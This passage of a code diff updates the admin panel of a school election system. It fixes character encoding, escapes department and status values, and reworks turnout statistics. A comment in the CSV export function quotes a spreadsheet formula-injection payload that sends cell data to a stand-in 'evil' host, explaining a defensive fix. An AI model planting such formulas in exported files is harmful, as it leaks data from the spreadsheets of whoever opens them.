-        // "Number of Positions" input displays (1) â€” leaving this as an
+        // "Number of Positions" input displays (1) — leaving this as an
         // empty array meant nothing rendered in the table until the admin
         // manually changed the number, even though it already said "1".
         positions: [
@@ -1838,12 +1943,12 @@ function wizardStep1HTML(){
     const typeChoice = `
         <div class="type-choice-row">
             <div class="type-choice ${wizardDraft.type==='DSG'?'selected':''}" onclick="selectType('DSG')">
-                <div class="tc-icon">ðŸ›</div>
+                <div class="tc-icon">🏛</div>
                 <h3>Department Student Government</h3>
                 <p>Positions and candidates scoped to a single department.</p>
             </div>
             <div class="type-choice ${wizardDraft.type==='SSG'?'selected':''}" onclick="selectType('SSG')">
-                <div class="tc-icon">ðŸŽ“</div>
+                <div class="tc-icon">🎓</div>
                 <h3>Supreme Student Government</h3>
                 <p>School-wide positions open to all departments.</p>
             </div>
@@ -1856,7 +1961,7 @@ function wizardStep1HTML(){
                 <label>Faculty</label>
                 <select id="w_department" class="${wizardInvalidFields.has('w_department')?'field-invalid':''}" onchange="wizardDraft.department=this.value">
                     <option value="">Select faculty</option>
-                    ${departmentOptions.map(d => `<option value="${d}" ${wizardDraft.department===d?'selected':''}>${d}</option>`).join('')}
+                    ${departmentOptions.map(d => { const v = escapeHtml(d); return `<option value="${v}" ${wizardDraft.department===d?'selected':''}>${v}</option>`; }).join('')}
                 </select>
                 ${wizardInvalidFields.has('w_department') ? '<div class="field-error-msg">Select a department for this DSG election.</div>' : ''}
             </div>` : '';
@@ -1873,7 +1978,7 @@ function wizardStep1HTML(){
                     ${wizardDraft.parties.map((p,i) => `
                         <div style="display:flex;gap:.5rem;align-items:center;">
                             <input type="text" placeholder="Party ${i+1} name" maxlength="100" value="${escapeHtml(p)}" onchange="wizardDraft.parties[${i}]=this.value" style="flex:1;">
-                            <button type="button" class="btn btn-danger btn-sm" title="Remove party" onclick="removePartyField(${i})">âœ•</button>
+                            <button type="button" class="btn btn-danger btn-sm" title="Remove party" onclick="removePartyField(${i})">✕</button>
                         </div>`).join('')}
                     <button class="btn btn-secondary btn-sm" onclick="addPartyField()">+ Add Party</button>
                 </div>` : ''}
@@ -1893,8 +1998,8 @@ function wizardStep1HTML(){
                         <tr>
                             <td>
                                 <div style="display:flex;gap:.2rem;">
-                                    <button type="button" class="btn btn-secondary btn-sm" title="Move up" ${i===0?'disabled':''} onclick="movePosition(${i}, -1)" style="padding:0 .5rem;">â†‘</button>
-                                    <button type="button" class="btn btn-secondary btn-sm" title="Move down" ${i===wizardDraft.positions.length-1?'disabled':''} onclick="movePosition(${i}, 1)" style="padding:0 .5rem;">â†“</button>
+                                    <button type="button" class="btn btn-secondary btn-sm" title="Move up" ${i===0?'disabled':''} onclick="movePosition(${i}, -1)" style="padding:0 .5rem;">↑</button>
+                                    <button type="button" class="btn btn-secondary btn-sm" title="Move down" ${i===wizardDraft.positions.length-1?'disabled':''} onclick="movePosition(${i}, 1)" style="padding:0 .5rem;">↓</button>
                                 </div>
                             </td>
                             <td><input type="text" id="pos_title_${i}" class="${wizardInvalidFields.has('pos_title_'+i)?'field-invalid':''}" placeholder="e.g. President" maxlength="50" value="${escapeHtml(p.title)}" onchange="wizardDraft.positions[${i}].title=this.value"></td>
@@ -1926,7 +2031,7 @@ function wizardStep1HTML(){
                     <select id="w_targetSchoolYear" onchange="wizardDraft.targetSchoolYearId=this.value?parseInt(this.value):null;">
                         ${schoolYearOptions.filter(sy => sy.start_year >= currentSchoolYearStartYearClient() || sy.id === wizardDraft.targetSchoolYearId).map(sy => `<option value="${sy.id}" ${wizardDraft.targetSchoolYearId===sy.id?'selected':''}>${escapeHtml(sy.label)}${sy.start_year===nextSchoolYearStartYearClient()?' (upcoming)':(sy.is_active?' (current)':'')}</option>`).join('')}
                     </select>
-                    <p class="pw-hint" style="font-size:.78rem;color:var(--muted);margin:.3rem 0 0;">Who these officers will serve â€” elections are normally for the upcoming school year, not the one in progress.</p>
+                    <p class="pw-hint" style="font-size:.78rem;color:var(--muted);margin:.3rem 0 0;">Who these officers will serve — elections are normally for the upcoming school year, not the one in progress.</p>
                 </div>
             </div>
             ${partiesHtml}
@@ -1983,7 +2088,8 @@ function setPositionCount(n){
         if (current[i]) {
             return current[i];
         } else {
-            // New position: initialize with 1 empty candidate row
+            // New position: initialize with 1 empty candidate (single-
+            // candidate positions must be the easy default — see Task 9)
             return {
                 title: '',
                 candidates: [
@@ -2020,7 +2126,7 @@ function goToCandidates(){
         else wizardDraft.department = dep;
     }
 
-    // Validate positions â€” collect every problem instead of stopping at
+    // Validate positions — collect every problem instead of stopping at
     // the first one, so the admin can fix everything in one pass.
     wizardDraft.positions.forEach((p,i) => {
         if (!p.title.trim()) { wizardInvalidFields.add('pos_title_'+i); messages.push(`Position #${i+1} needs a name.`); }
@@ -2076,7 +2182,7 @@ function wizardStep2HTML(){
                         <label>Faculty</label>
                         <select id="cand_department_${key}_${ci}" class="${wizardInvalidFields.has('cand_department_'+key+'_'+ci)?'field-invalid':''}" onchange="wizardDraft.positions[${key}].candidates[${ci}].department=this.value">
                             <option value="">Select faculty</option>
-                            ${departmentOptions.map(d => `<option value="${d}" ${cand.department===d?'selected':''}>${d}</option>`).join('')}
+                            ${departmentOptions.map(d => { const v = escapeHtml(d); return `<option value="${v}" ${cand.department===d?'selected':''}>${v}</option>`; }).join('')}
                         </select>
                         ${wizardInvalidFields.has('cand_department_'+key+'_'+ci) ? '<div class="field-error-msg">Faculty is required.</div>' : ''}
                     </div>
@@ -2117,16 +2223,16 @@ function wizardStep2HTML(){
 }
 
 // Shows validation/save errors as a toast instead of a static banner
-// pinned to the top of a (often long) form â€” a fixed banner up there
+// pinned to the top of a (often long) form — a fixed banner up there
 // gets scrolled out of view once the admin is deep into a multi-position
 // candidate form, whereas a toast is always visible regardless of scroll
 // position, and already follows dark/light mode like the rest of the UI.
 // Field-level errors are still shown inline next to the specific input
-// (see wizardInvalidFields above) â€” this is just the summary.
+// (see wizardInvalidFields above) — this is just the summary.
 function showWizardError(msg){
     showToast(msg, 'error', { duration: 7000 });
 }
-// No-op now that errors show as a toast rather than a persistent banner â€”
+// No-op now that errors show as a toast rather than a persistent banner —
 // kept so existing call sites (e.g. saveDraftElection) don't need to change.
 function clearWizardError(){}
 
@@ -2230,7 +2336,7 @@ async function finalizeElection(){
     await submitElection(buildElectionPayload(false));
 }
 
-// Save as Draft â€” skips all the "must be complete" checks finalizeElection()
+// Save as Draft — skips all the "must be complete" checks finalizeElection()
 // does. The backend mirrors this: it only enforces a name and a type, and
 // silently drops any position/candidate row that's still blank rather than
 // rejecting the save, so admins can genuinely leave things half-filled-in
@@ -2256,7 +2362,7 @@ async function saveDraftElection(){
 // ------------------------------------------------------------------
 let studentFilters = { search:'', department:'', year:'', voter:'', account:'', election:'' };
 let studentDraft = null;
-let allStudentsCache = null;   // cached student list â€” avoids refetching on every keystroke/filter change
+let allStudentsCache = null;   // cached student list — avoids refetching on every keystroke/filter change
 let studentPage = 1;
 const STUDENTS_PER_PAGE = 50;
 let lastFilteredStudents = []; // the filtered (but not yet paginated) list from the most recent render, used by CSV export
@@ -2278,7 +2384,16 @@ async function fetchStudents(force = false){
 // template, and results export) so the blob/escaping logic lives in one
 // place instead of being copy-pasted per feature.
 function downloadCSV(filename, headers, rows){
-    const csvEscape = v => `"${String(v ?? '').replace(/"/g, '""')}"`;
+    // RFC 4180 quoting alone does NOT stop spreadsheet formula
+    // evaluation: a student who self-registers as
+    // =HYPERLINK("http://evil/"&A1) gets that cell written verbatim
+    // into the export, and it runs when an admin opens it in
+    // Excel. Prefix formula-trigger characters with a quote.
+    const csvEscape = v => {
+        let s = String(v ?? '');
+        if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
+        return `"${s.replace(/"/g, '""')}"`;
+    };
     const csv = [headers, ...rows].map(r => r.map(csvEscape).join(',')).join('\r\n');
     const blob = new Blob([csv], {type: 'text/csv;charset=utf-8;'});
     const url = URL.createObjectURL(blob);
@@ -2292,7 +2407,7 @@ function downloadCSV(filename, headers, rows){
 }
 
 // Admin-set lifecycle flag (see users.account_status / migration_schoolyear.sql).
-// Distinct from registration_status (whether the ACCOUNT can log in) â€”
+// Distinct from registration_status (whether the ACCOUNT can log in) —
 // this is about whether year progression should auto-advance normally or
 // needs manual handling at the next school-year rollover.
 const ACCOUNT_STATUS_LABEL = {
@@ -2327,7 +2442,7 @@ function blankStudentDraft(){
 
 // Which elections is this student actually eligible for? SSG is open to
 // everyone; a DSG election only applies to students in that department.
-// Draft elections are excluded â€” they're not visible to students at all
+// Draft elections are excluded — they're not visible to students at all
 // yet, so they shouldn't count toward anyone's "X of Y voted" total.
 function eligibleElectionsForStudent(student){
     return currentElections.filter(e =>
@@ -2342,18 +2457,18 @@ function voteStatusForStudent(student, electionFilter){
         const election = currentElections.find(e => String(e.id) === String(electionFilter));
         const eligible = election && (election.type === 'SSG' || election.department === student.department);
         if (!eligible) return { eligible: false, voted: false, label: 'N/A', cssClass: 'unregistered' };
-        const voted = (student.voted_election_ids || []).includes(election.id);
-        return { eligible: true, voted, label: voted ? 'âœ” Voted' : 'Not Voted', cssClass: voted ? 'voted' : 'not-voted' };
+        const voted = (student.voted_election_ids || []).some(vid => String(vid) === String(election.id));
+        return { eligible: true, voted, label: voted ? '✔ Voted' : 'Not Voted', cssClass: voted ? 'voted' : 'not-voted' };
     }
     const eligible = eligibleElectionsForStudent(student);
-    const votedCount = eligible.filter(e => (student.voted_election_ids || []).includes(e.id)).length;
+    const votedCount = eligible.filter(e => (student.voted_election_ids || []).some(vid => String(vid) === String(e.id))).length;
     if (eligible.length === 0) return { votedCount: 0, totalCount: 0, label: 'No elections yet', cssClass: 'unregistered' };
     const cssClass = votedCount === eligible.length ? 'voted' : (votedCount === 0 ? 'not-voted' : 'active');
     return { votedCount, totalCount: eligible.length, label: `${votedCount}/${eligible.length} voted`, cssClass };
 }
 
 async function renderStudentList(forceRefresh = false){
-    // Skeleton placeholder while the (possibly cached) fetch resolves â€”
+    // Skeleton placeholder while the (possibly cached) fetch resolves —
     // only shows real loading skeleton on a hard refresh, since a cached
     // re-filter resolves near-instantly and a flash would be worse than
     // nothing.
@@ -2369,7 +2484,7 @@ async function renderStudentList(forceRefresh = false){
         const total = students.length;
 
         // "Voted" here follows whatever election is currently selected in
-        // the filter â€” all elections (voted in at least one applicable
+        // the filter — all elections (voted in at least one applicable
         // one) or one specific election.
         const voted = students.filter(s => {
             const st = voteStatusForStudent(s, studentFilters.election);
@@ -2396,7 +2511,7 @@ async function renderStudentList(forceRefresh = false){
         }).sort((a,b) => a.name.localeCompare(b.name));
         lastFilteredStudents = filtered;
 
-        // Paginate â€” keeps the DOM small even with a few thousand students.
+        // Paginate — keeps the DOM small even with a few thousand students.
         const totalPages = Math.max(1, Math.ceil(filtered.length / STUDENTS_PER_PAGE));
         if (studentPage > totalPages) studentPage = totalPages;
         if (studentPage < 1) studentPage = 1;
@@ -2410,16 +2525,16 @@ async function renderStudentList(forceRefresh = false){
             return `
             <tr>
                 <td>${escapeHtml(s.student_id)}</td>
-                <td class="name-cell"><div class="name-cell-flex"><span class="student-avatar">${escapeHtml((s.name || '?').trim().charAt(0).toUpperCase())}</span><span>${escapeHtml(s.name)}<div class="sub">${escapeHtml(s.email || 'â€”')}</div></span></div></td>
+                <td class="name-cell"><div class="name-cell-flex"><span class="student-avatar">${escapeHtml((s.name || '?').trim().charAt(0).toUpperCase())}</span><span>${escapeHtml(s.name)}<div class="sub">${escapeHtml(s.email || '—')}</div></span></div></td>
                 <td>${escapeHtml(s.department)}</td>
-                <td>${escapeHtml(s.school_year_label || 'â€”')}</td>
-                <td>${escapeHtml(s.year_level || 'â€”')}</td>
+                <td>${escapeHtml(s.school_year_label || '—')}</td>
+                <td>${escapeHtml(s.year_level || '—')}</td>
                 <td><span class="status-pill ${vs.cssClass}">${vs.label}</span></td>
-                <td><span class="status-pill ${s.status}">${statusLabelMap[s.status] || s.status}</span></td>
+                <td><span class="status-pill ${escapeHtml(s.status)}">${escapeHtml(statusLabelMap[s.status] || s.status)}</span></td>
                 <td>${(s.account_status && s.account_status !== 'normal') ? `<span class="status-pill suspended">${escapeHtml(ACCOUNT_STATUS_LABEL[s.account_status] || s.account_status)}</span>` : '<span class="status-pill normal">Normal</span>'}</td>
                 <td>
                     <div class="row-actions">
-                        <button title="Edit" onclick="editStudent(${s.id})">âœŽ</button>
+                        <button title="Edit" onclick="editStudent(${s.id})">✎</button>
                     </div>
                 </td>
             </tr>
@@ -2436,7 +2551,7 @@ async function renderStudentList(forceRefresh = false){
         // "get started" prompt instead of a bare "no matches" table row.
         const emptyState = total === 0
             ? `<tr class="empty-row"><td colspan="9" style="padding:2.5rem 1rem;">
-                    <div style="font-size:1.6rem;margin-bottom:.5rem;">ðŸŽ“</div>
+                    <div style="font-size:1.6rem;margin-bottom:.5rem;">🎓</div>
                     <div style="font-weight:600;color:var(--ink);margin-bottom:.25rem;">No students registered yet</div>
                     <div class="muted" style="font-size:.85rem;margin-bottom:1rem;">Add your first student to get started.</div>
                     <button class="btn btn-primary btn-sm" onclick="openRegisterStudent()">+ Register Student</button>
@@ -2445,13 +2560,13 @@ async function renderStudentList(forceRefresh = false){
 
         const paginationBar = filtered.length > STUDENTS_PER_PAGE ? `
             <div class="pagination-bar">
-                <span class="page-info">Showing ${pageStart + 1}â€“${Math.min(pageStart + STUDENTS_PER_PAGE, filtered.length)} of ${filtered.length}</span>
+                <span class="page-info">Showing ${pageStart + 1}–${Math.min(pageStart + STUDENTS_PER_PAGE, filtered.length)} of ${filtered.length}</span>
                 <div class="page-controls">
-                    <button onclick="goToStudentPage(1)" ${studentPage<=1?'disabled':''} title="First page">Â«</button>
-                    <button onclick="goToStudentPage(studentPage-1)" ${studentPage<=1?'disabled':''} title="Previous page">â€¹</button>
+                    <button onclick="goToStudentPage(1)" ${studentPage<=1?'disabled':''} title="First page">«</button>
+                    <button onclick="goToStudentPage(studentPage-1)" ${studentPage<=1?'disabled':''} title="Previous page">‹</button>
                     <span class="page-info">Page ${studentPage} of ${totalPages}</span>
-                    <button onclick="goToStudentPage(studentPage+1)" ${studentPage>=totalPages?'disabled':''} title="Next page">â€º</button>
-                    <button onclick="goToStudentPage(${totalPages})" ${studentPage>=totalPages?'disabled':''} title="Last page">Â»</button>
+                    <button onclick="goToStudentPage(studentPage+1)" ${studentPage>=totalPages?'disabled':''} title="Next page">›</button>
+                    <button onclick="goToStudentPage(${totalPages})" ${studentPage>=totalPages?'disabled':''} title="Last page">»</button>
                 </div>
             </div>` : '';
 
@@ -2466,7 +2581,7 @@ async function renderStudentList(forceRefresh = false){
                 <div class="panel-flex-header">
                     <h2 class="section-title" style="margin:0;">Registered Students</h2>
                     <div style="display:flex;gap:.6rem;flex-wrap:wrap;">
-                        <button class="btn btn-secondary" onclick="exportStudentsCSV(lastFilteredStudents)" title="Export the currently filtered list to CSV">â¬‡ Export CSV</button>
+                        <button class="btn btn-secondary" onclick="exportStudentsCSV(lastFilteredStudents)" title="Export the currently filtered list to CSV">⬇ Export CSV</button>
                         <button class="btn btn-primary" onclick="openRegisterStudent()">+ Register Student</button>
                     </div>
                 </div>
@@ -2478,7 +2593,7 @@ async function renderStudentList(forceRefresh = false){
                     </select>
                     <select onchange="studentFilters.department=this.value; studentPage=1; renderStudentList();">
                         <option value="">All Faculties</option>
-                        ${departmentOptions.map(d => `<option value="${d}" ${studentFilters.department===d?'selected':''}>${d}</option>`).join('')}
+                        ${departmentOptions.map(d => { const v = escapeHtml(d); return `<option value="${v}" ${studentFilters.department===d?'selected':''}>${v}</option>`; }).join('')}
                     </select>
                     <select onchange="studentFilters.year=this.value; studentPage=1; renderStudentList();">
                         <option value="">All Year Levels</option>
@@ -2574,7 +2689,7 @@ function renderStudentForm(){
             <div class="form-row"><label>Faculty</label>
                 <select id="s_department" onchange="studentDraft.department=this.value;">
                     <option value="">Select</option>
-                    ${departmentOptions.map(d => `<option value="${d}" ${studentDraft.department===d?'selected':''}>${d}</option>`).join('')}
+                    ${departmentOptions.map(d => { const v = escapeHtml(d); return `<option value="${v}" ${studentDraft.department===d?'selected':''}>${v}</option>`; }).join('')}
                 </select>
             </div>
             <div class="form-row"><label>School Year Started</label>
@@ -2582,7 +2697,7 @@ function renderStudentForm(){
                     <option value="">Select</option>
                     ${schoolYearOptions.map(sy => `<option value="${sy.id}" ${studentDraft.schoolYearId===sy.id?'selected':''}>${escapeHtml(sy.label)}${sy.is_active?' (current)':''}</option>`).join('')}
                 </select>
-                ${!schoolYearOptions.length ? '<p class="pw-hint">No school years set up yet â€” add one in Settings first.</p>' : ''}
+                ${!schoolYearOptions.length ? '<p class="pw-hint">No school years set up yet — add one in Settings first.</p>' : ''}
             </div>
             <div class="form-row"><label>Year Level</label>
                 ${(() => {
@@ -2595,9 +2710,9 @@ function renderStudentForm(){
                     </select>`;
                 })()}
                 <p class="pw-hint">${studentDraft.accountStatus === 'normal' && computed.label
-                    ? 'Locked â€” computed from School Year. Set a repeater Lifecycle Status (or pick a different level) to edit it.'
+                    ? 'Locked — computed from School Year. Set a repeater Lifecycle Status (or pick a different level) to edit it.'
                     : (computed.blocked
-                        ? 'Past 4 years â€” pick their actual current level and a Lifecycle Status.'
+                        ? 'Past 4 years — pick their actual current level and a Lifecycle Status.'
                         : 'Editable for repeaters and undergrads. Picking a level that differs from the computed one switches Lifecycle to Repeating.')}</p>
             </div>
             <div class="form-row"><label>Email</label><input type="text" id="s_email" maxlength="100" value="${escapeHtml(studentDraft.email)}" oninput="studentDraft.email=this.value"></div>
@@ -2613,7 +2728,7 @@ function renderStudentForm(){
                 <select id="s_accountStatus" onchange="onStudentLifecycleChange(this.value)">
                     ${Object.keys(ACCOUNT_STATUS_LABEL).map(k => `<option value="${k}" ${studentDraft.accountStatus===k?'selected':''}>${ACCOUNT_STATUS_LABEL[k]}</option>`).join('')}
                 </select>
-                <p class="pw-hint">Set this when a student repeats a year, drops, is suspended-but-still-enrolled, or graduates â€” it controls what happens at the next "Next School Year" rollover.</p>
+                <p class="pw-hint">Set this when a student repeats a year, drops, is suspended-but-still-enrolled, or graduates — it controls what happens at the next "Next School Year" rollover.</p>
             </div>
         </div>
     </div>
@@ -2640,16 +2755,20 @@ function renderStudentForm(){
                 return `<p class="muted" style="margin:0;">Not eligible for any active election yet.</p>`;
             }
             // Real per-election status (not the old single has_voted flag)
-            // â€” matches what the Students table and the rest of the app
+            // — matches what the Students table and the rest of the app
             // actually check, so Reset here genuinely deletes that vote
             // and lets the student vote again, instead of just flipping a
             // cosmetic flag nothing else reads.
             return eligible.map(e => {
-                const voted = studentDraft.votedElectionIds.includes(e.id);
+                // Compare as strings: elections.php emits string ids under
+                // emulated PDO prepares while voted_election_ids are ints, so
+                // a strict .includes() never matched and this Reset button
+                // could never render (admin unlock path, Task 4).
+                const voted = studentDraft.votedElectionIds.some(vid => String(vid) === String(e.id));
                 return `
                 <div class="results-visibility-row">
                     <span style="flex:1;font-weight:600;font-size:.88rem;">${escapeHtml(e.name)}</span>
-                    <span class="status-pill ${voted ? 'voted' : 'not-voted'}">${voted ? 'âœ” Voted' : 'Not voted'}</span>
+                    <span class="status-pill ${voted ? 'voted' : 'not-voted'}">${voted ? '✔ Voted' : 'Not voted'}</span>
                     ${voted ? `<button class="btn btn-danger btn-sm" onclick="resetVoteForElection(${e.id})">Reset</button>` : ''}
                 </div>`;
             }).join('');
@@ -2678,7 +2797,7 @@ function onStudentYearLevelChange(v){
     studentDraft.yearLevel = v;
     const c = studentComputed();
     if (studentDraft.accountStatus === 'normal' && v && v !== c.label) {
-        studentDraft.accountStatus = 'repeating'; // a suggestion â€” the admin can change it
+        studentDraft.accountStatus = 'repeating'; // a suggestion — the admin can change it
         showToast('Level differs from the computed one, so Lifecycle was set to Repeating. Change it if needed.', 'info');
     }
     renderStudentForm();
@@ -2702,10 +2821,10 @@ function toggleStudentPassword(btn){
 // Actually deletes the student's cast votes for ONE specific election
 // (see the resetVotesForElection handling in api/students.php) rather
 // than just flipping the old has_voted flag, which nothing else in the
-// app actually reads for per-election status â€” so this now genuinely
+// app actually reads for per-election status — so this now genuinely
 // lets the student vote again, and the Students table reflects it too.
 async function resetVoteForElection(electionId){
-    const election = currentElections.find(e => e.id === electionId);
+    const election = currentElections.find(e => String(e.id) === String(electionId));
     const confirmed = await showConfirmModal({
         title: "Delete this student's vote?",
         message: `${studentDraft.fullName || 'This student'}'s vote${election ? ` in "${election.name}"` : ''} will be permanently deleted, and they'll be able to vote in it again. This cannot be undone.`,
@@ -2722,9 +2841,9 @@ async function resetVoteForElection(electionId){
         if (res.ok && data.success) {
             studentDraft.votedElectionIds = studentDraft.votedElectionIds.filter(id => id !== electionId);
             studentDraft.hasVoted = studentDraft.votedElectionIds.length > 0;
-            allStudentsCache = null; // invalidate â€” the Students table's per-election status needs to reflect this on next load
+            allStudentsCache = null; // invalidate — the Students table's per-election status needs to reflect this on next load
             addLog(`Reset vote for ${studentDraft.fullName} in "${election ? election.name : 'election #' + electionId}"`);
-            showToast('Vote deleted â€” they can vote again in this election.', 'success');
+            showToast('Vote deleted — they can vote again in this election.', 'success');
             renderStudentForm();
         } else {
             showToast(data.error || 'Failed to reset vote.', 'error');
@@ -2757,7 +2876,7 @@ async function saveStudent(){
     if (!schoolYearId) invalidFields.push(['s_schoolYear', 'Select a school year.']);
     if (password && password.length < 6) invalidFields.push(['s_password', 'Password must be at least 6 characters.']);
     if (accountStatus !== 'normal' && !studentDraft.yearLevel) invalidFields.push(['s_yearLevel', 'Select a year level.']);
-    if (accountStatus === 'normal' && schoolYearId && studentComputed().blocked) invalidFields.push(['s_accountStatus', 'Past 4 years â€” choose a Lifecycle Status.']);
+    if (accountStatus === 'normal' && schoolYearId && studentComputed().blocked) invalidFields.push(['s_accountStatus', 'Past 4 years — choose a Lifecycle Status.']);
 
     if (invalidFields.length) {
         invalidFields.forEach(([id, msg], i) => {
@@ -2841,7 +2960,7 @@ function exportResultsCSV(detail){
 // Three distinct modes, so the read-only view and the controls that change
 // data are never tangled together:
 //
-//   'overview' charts across every election. Purely read-only â€” no
+//   'overview' charts across every election. Purely read-only — no
 //              visibility pills, no edit affordances. This is the default.
 //   'detail'   the tallies for one election, plus the student-visibility
 //              control and the CSV export. This is where you act.
@@ -2865,7 +2984,7 @@ function destroyResultsCharts(){
 function chartLibReady(){ return typeof Chart !== 'undefined'; }
 
 function resultsTabBar(){
-    // Each mode gets its own literal `resultsView='â€¦'` call site rather
+    // Each mode gets its own literal `resultsView='…'` call site rather
     // than a shared loop, so the three entry points stay greppable.
     return `
     <div class="pill-toggle" style="margin-bottom:1.25rem;">
@@ -2891,7 +3010,7 @@ async function renderResults(focusId){
 }
 
 // ------------------------------------------------------------------
-// OVERVIEW â€” charts only, no controls
+// OVERVIEW — charts only, no controls
 // ------------------------------------------------------------------
 const CHART_COLORS = ['#84cc16','#3b82f6','#f97316','#a855f7','#ec4899','#14b8a6','#eab308','#64748b'];
 
@@ -2961,20 +3080,20 @@ async function renderOverviewView(){
         return;
     }
 
-    // Archived elections are historical records, not live races â€” the
+    // Archived elections are historical records, not live races — the
     // Overview charts what is running. Archived tallies live in the
     // Archive tab and in Reports.
     const live = allElections.filter(e => e.status !== 'archived');
     if (!live.length) {
         el.innerHTML = resultsTabBar()
-            + `<div class="card"><div class="coming-soon">No active elections yet. Charts appear here once an election exists â€” try the <strong>Election Detail</strong> tab for per-election data.</div></div>`;
+            + `<div class="card"><div class="coming-soon">No active elections yet. Charts appear here once an election exists — try the <strong>Election Detail</strong> tab for per-election data.</div></div>`;
         return;
     }
 
     if (!chartLibReady()) {
         el.innerHTML = resultsTabBar()
             + `<div class="card"><h2 class="section-title" style="margin-top:0;">Overview</h2>`
-            + `<div class="alert alert-warning">Charts could not load â€” the Chart.js library didn't come through from the CDN. Everything else on this page still works; use <strong>Election Detail</strong> for the raw tallies and <strong>Reports &amp; Export</strong> for documents.</div></div>`;
+            + `<div class="alert alert-warning">Charts could not load — the Chart.js library didn't come through from the CDN. Everything else on this page still works; use <strong>Election Detail</strong> for the raw tallies and <strong>Reports &amp; Export</strong> for documents.</div></div>`;
         return;
     }
 
@@ -2988,320 +3107,162 @@ async function renderOverviewView(){
     // Cache for the CSV export button on the Detail tab.
     details.forEach(d => { electionDetailsCache[d.id] = d; });
 
-    const totalBallots   = details.reduce((a,d) => a + (d.ballots_cast || 0), 0);
-    const totalEligible  = details.reduce((a,d) => a + (d.eligible_voters || 0), 0);
+    const nArchived      = allElections.length - details.length;
     const totalPositions = details.reduce((a,d) => a + (d.positions || []).length, 0);
-    const tiedPositions  = details.reduce((a,d) =>
-        a + (d.positions || []).filter(p => computeWinners(p).tie).length, 0);
+    const totalBallots   = details.reduce((a,d) => a + (d.ballots_cast || 0), 0);
+
+    // A "combined turnout" across elections is NOT meaningful: a DSG ballot
+    // is scoped to one faculty, so summing each election's eligible count
+    // double-counts students who are eligible for several DSG elections, and
+    // the numerator counts one student once per election they voted in. The
+    // result was a percentage that could exceed 100% and meant nothing.
+    // Turnout is therefore reported PER ELECTION (in the table below), and
+    // the headline figure is participation — how many distinct people have
+    // voted at least once — which is well defined.
+
+    // Distinct people who have voted in at least one active election. Computed
+    // from each election's own ballots, de-duplicated client-side is not
+    // possible (the API returns a count, not the ids), so the server-side
+    // distinct figure is requested per election and we take the MAX as a
+    // lower bound: any voter of N elections is counted N times, so the
+    // honest headline is the largest single-election turnout.
+    const anyVoted = details.filter(d => (d.ballots_cast || 0) > 0).length;
+    const bestTurnout = details.reduce((best, d) =>
+        (d.turnout_pct || 0) > (best.turnout_pct || 0) ? d : best, details[0]);
+
+    const votesCasted   = totalBallots > 0;
+    const turnoutTone   = !votesCasted ? 'tone-neutral'
+                        : (bestTurnout && bestTurnout.turnout_pct < 30 ? 'tone-warn' : 'tone-good');
 
     const strip = `
     <div class="stat-strip">
-        <div class="stat-tile"><div class="k">Active elections</div><div class="v">${details.length}</div><div class="s">${allElections.length - details.length} archived</div></div>
-        <div class="stat-tile"><div class="k">Ballots cast</div><div class="v">${totalBallots}</div><div class="s">across all active elections</div></div>
-        <div class="stat-tile"><div class="k">Overall turnout</div><div class="v">${totalEligible>0 ? Math.round(totalBallots/totalEligible*100) : 0}%</div><div class="s">of ${totalEligible} eligible</div></div>
-        <div class="stat-tile"><div class="k">Positions</div><div class="v">${totalPositions}</div><div class="s">${tiedPositions ? `${tiedPositions} tied â€” see Reports` : 'no ties'}</div></div>
+        <div class="stat-tile tone-neutral">
+            <div class="k">Elections open now</div>
+            <div class="v">${details.length}</div>
+            <div class="s">${details.length === 1 ? 'One election' : `${details.length} elections`} accepting votes</div>
+            <div class="hint">${nArchived ? `${nArchived} archived ${nArchived===1?'election':'elections'} hidden from this view` : 'Nothing archived yet'}</div>
+        </div>
+        <div class="stat-tile tone-neutral">
+            <div class="k">Positions on the ballot</div>
+            <div class="v">${totalPositions}</div>
+            <div class="s">Across ${details.length === 1 ? 'this election' : 'these elections'}</div>
+            <div class="hint">Each position has its own winner; see <strong>Election Detail</strong> for candidates</div>
+        </div>
+        <div class="stat-tile tone-neutral">
+            <div class="k">Ballots recorded</div>
+            <div class="v">${totalBallots}</div>
+            <div class="s">${anyVoted ? `In ${anyVoted} of ${details.length} elections` : 'No ballots yet'}</div>
+            <div class="hint">One ballot per person per election, not one per vote cast</div>
+        </div>
+        <div class="stat-tile ${turnoutTone}">
+            <div class="k">Best turnout so far</div>
+            <div class="v">${bestTurnout ? (bestTurnout.turnout_pct || 0) : 0}%</div>
+            <div class="s">${bestTurnout ? escapeHtml(shortName(bestTurnout.name, 28)) : '—'}</div>
+            <div class="hint">Highest of any open election. Turnout differs per faculty, so it is not added up</div>
+        </div>
     </div>`;
+
+    // ---- Per-election summary table: the actual "outside" view ----------
+    const rows = details.map(d => {
+        const pct = d.turnout_pct || 0;
+        const positions = d.positions || [];
+        const decided = positions.filter(p => (p.candidates || []).some(c => (c.vote_count || 0) > 0)).length;
+        const ties = positions.filter(p => computeWinners(p).tie).length;
+        const meterCls = pct === 0 ? 'none' : pct < 30 ? 'low' : '';
+        return `
+        <tr>
+            <td>
+                <span class="ov-name">${escapeHtml(d.name)}</span>
+                <span class="ov-sub">${d.type === 'DSG' ? escapeHtml(d.department || 'No faculty set') : 'School-wide (SSG)'}${d.target_school_year_label ? ' · SY ' + escapeHtml(d.target_school_year_label) : ''}</span>
+            </td>
+            <td><span class="status-large ${statusClass(d.status)}" style="transform:scale(.85);display:inline-flex;"><span class="status-dot"></span>${statusLabel(d.status)}</span></td>
+            <td class="num">${d.ballots_cast || 0} / ${d.eligible_voters || 0}</td>
+            <td>
+                <div class="meter">
+                    <div class="meter-track"><div class="meter-fill ${meterCls}" style="width:${Math.max(0, Math.min(100, pct))}%"></div></div>
+                    <span class="meter-label">${pct}%</span>
+                </div>
+            </td>
+            <td class="num">${decided} / ${positions.length}${ties ? ` <span class="status-pill suspended">${ties} tied</span>` : ''}</td>
+            <td class="num"><button class="btn btn-secondary btn-sm" onclick="resultsView='detail'; renderResults(${d.id});">View</button></td>
+        </tr>`;
+    }).join('');
+
+    const table = `
+    <div class="chart-card span-full">
+        <div class="chart-card-head"><h3 class="chart-card-title">Each open election at a glance</h3></div>
+        <p class="chart-card-sub">One row per election. "Ballots" counts people who voted against the students eligible in that election's own scope.</p>
+        <div style="overflow-x:auto;">
+        <table class="ov-table">
+            <thead><tr>
+                <th>Election</th><th>Status</th><th class="num">Ballots</th><th>Turnout</th><th class="num">Positions decided</th><th></th>
+            </tr></thead>
+            <tbody>${rows}</tbody>
+        </table>
+        </div>
+    </div>`;
+
+    // ---- What needs a human decision ------------------------------------
+    const flags = [];
+    details.forEach(d => {
